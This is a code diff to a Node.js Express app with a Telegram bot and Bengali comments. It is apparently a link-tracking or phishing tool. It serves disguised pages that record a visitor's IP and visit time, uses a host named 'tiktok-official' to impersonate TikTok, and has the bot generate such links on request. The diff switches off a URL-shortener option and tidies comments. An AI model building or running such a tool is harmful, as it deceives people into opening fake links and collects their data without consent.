@@ -15,8 +15,8 @@ app.set("view engine", "ejs");
 
 //Modify your URL here
 var hostURL="https://www.tiktok-official.onrender.com";
-//TOGGLE for codetabs Proxy and Shorters
-var usecodetabs=true;
+// এই লাইনটি পরিবর্তন করা হয়েছে যেন লিঙ্ক শর্ট না হয়
+var usecodetabs=false;
 
 app.get("/w/:path/:uri",(req,res)=>{
 var ip;
@@ -30,7 +30,6 @@ res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,
 else{
 res.redirect("https://t.me/ehtool");
 }
-
 
 });
 
@@ -48,16 +47,12 @@ else{
 res.redirect("https://t.me/ehtool");
 }
 
-
 });
-
 
 
 bot.on('message', async (msg) => {
 const chatId = msg.chat.id;
 
-
-// এখানে কোডটি পরিবর্তন করা হয়েছে
 if(msg?.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
  createLink(chatId,msg.text);
 }
@@ -146,12 +141,8 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-// এখানে কোডটি পরিবর্তন করা হয়েছে
 bot.sendMessage(cid,`🌐 আপনার লিঙ্কটি দিন`,mk);
 }
-
-
-
 
 
 app.get("/", (req, res) => {
